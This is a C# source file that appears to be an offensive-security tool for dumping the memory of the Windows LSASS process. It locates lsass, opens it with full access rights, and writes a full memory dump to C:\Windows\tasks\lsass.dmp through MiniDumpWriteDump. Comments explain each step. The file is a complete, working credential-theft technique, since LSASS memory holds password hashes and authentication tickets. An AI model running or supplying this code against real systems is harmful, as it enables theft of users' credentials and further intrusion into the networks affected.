using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;



namespace MiniDumpWriteDump
{
    internal class Program
    {

        /*
         *  BOOL MiniDumpWriteDump(
              HANDLE                            hProcess,
              DWORD                             ProcessId,
              HANDLE                            hFile,
              MINIDUMP_TYPE                     DumpType,
              PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
              PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
              PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
            );
         * 
         * To dump file.
         */
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess, //Must be a LSASS handle
            int ProcessId,  //Must be the process ID of LSASS
            IntPtr hFile, //A handle to the file that contains the generated memory dump
            int DumpType, //An enumeration type. Set it to "2" for full memory dump
            IntPtr ExceptionParam,
            IntPtr UserStreamParam, 
            IntPtr CallbackParam
        );

        /*
         * 
         * 
         */
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(
            uint processAccess, 
            bool bInheritHandle,
            int processId
        );

        static void Main(string[] args)
        {
            //Using FileStream to create an empty dump file. 
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);

            //To get the process ID of LSAAS
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);

            //Convert the dumpfile to C-style file handle through the DangerousGetHandle method of the SafeHandle class.
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);


        }
    }
}
